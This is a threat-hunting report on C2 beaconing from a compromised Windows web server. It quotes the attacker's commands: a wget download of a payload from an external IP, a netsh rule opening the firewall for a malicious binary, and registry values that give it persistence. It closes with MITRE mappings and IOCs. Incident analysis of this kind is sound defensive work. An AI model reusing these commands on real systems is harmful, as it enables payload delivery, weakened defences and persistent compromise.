# Threat Hunting Report

**Title**: Active C2 Communication

**Scope**: Host= KCD-Web | User= NT AUTHORITY\SYSTEM

**Date**: 2026-04-20

**Author**: Rabi Prajapati

**Tools Used**: Splunk

**Alert:** C2 Beaconing Pattern Detected

**Description:** A process “C:\Windows\Fonts\init\client.exe” made 88 connections to an external ip 8.8.8.8 within 1 hour, indicating automated C2 beaconing behavior.

---

**Findings**

2/12/26 4:55:32.794 AM: “urlmon.dll” Image loaded by malware HRSword.exe for C2 communication. Registry modification

![Screenshot 2026-04-20 at 22.55.15.png](attachment:8e895982-f13e-4164-aa7d-9add20d72d60:Screenshot_2026-04-20_at_22.55.15.png)

4/5/26 4:10:48.465 PM: wasp.exe created a pipe named “\chrome.4964.2.205802953”

4/5/26 4:10:48.465 PM: Changes the working directory and execute HRSword.bat file within self-extracting temp folder.

```jsx
"C:\Windows\System32\cmd.exe" /c @pushd "C:\Users\ftp$\AppData\Local\Temp\7ZipSfx.000" &gt;nul 2&gt;&amp;1 &amp; CALL "C:\Users\ftp$\AppData\Local\Temp\7ZipSfx.000\HRSword.bat"
```

4/8/26 8:51:10.289 AM: User “ftp$” executed malicious file “HRSword.exe”.

4/8/26 8:53:48.866 AM: User “ftp$” Downloaded suspicious file “p2.exe”

```jsx
CommandLine: wget http://1:1@82.147.85.6/p2.exe -O C:\Windows\p2.exe
```

4/8/26 8:53:59.288 AM: File creation by process “p2.exe” including __tmp_rar_sfx_access_check_233072968,svchost.exe,1.exe,wininit.ini,2.exe,client.exe,go.bat,instsrv.exe,srvany.exe  within below path. Definitely p2.exe seems to be secondary payload.

```jsx
TargetFilePath: C:\Windows\Fonts\init
```

4/8/26 8:54:00.397 AM: User “ftp$” executed netsh.exe that added firewall rule to allow inbound connection from “client.exe” 

```jsx
CommandLine: netsh advfirewall firewall add rule name="Windows Locator" dir=in action=allow program="C:\windows\fonts\init\client.exe" enable=yes
```

4/8/26 8:54:03.319 AM: Registry modification for execution of “client.exe” in windows boot.

```jsx
registry_path= HKLM\System\CurrentControlSet\Services\Wininit\Parameters\Application	
registry_value_data= C:\windows\fonts\init\client.exe
```

4/8/26 8:54:03.319 AM: Multiple file creation by client.exe

4/8/26 8:54:03.460 AM: Multiple Pipe Events creation by client.exe

4/8/26 8:54:09.288 AM: Modification in registry run key for **persistence** by client.exe

```jsx
registry_path = HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\Peer2Profit
registry_value_data = "C:\windows\fonts\init\client.exe" --minimize
```

4/8/26 8:54:28.523 AM: Masqueraded “svchost.exe” for malware ServiceE.exe execution by services.exe. Execution of malicious file “wahiver.exe”

```jsx
CommandLine: C:\Windows\fonts\w\svchost.exe run
```

This malicious file made network connection to multiple suspicious Russian servers:

```jsx
178.248.233.33
185.180.201.1
185.213.157.164
87.240.129.133
87.240.132.67
87.240.132.72
87.240.132.78
87.240.137.164
89.221.239.1
90.156.232.4
```

---

**MITRE ATT&CK Mapping**

- T1204.002 – User Execution: Malicious File
- T1547 – Boot or Logon Autostart Execution
- T1562.004 – Impair Defenses: Disable or Modify System Firewall
- T1071.004 – Application Layer Protocol: DNS for C2

---

### **Deliverables**

- IOCs
    - Malicious Files
        - HRSword.exe
        - ServiceE.exe
        - wahiver.exe
        - client.exe
    - DNS queried
        - testdomainlocalsecololoalala234nhv[.]wtd
        - habrahabr[.]ru
        - node0[.]waspace[.]net
        - mail[.]ru
        - vk[.]com
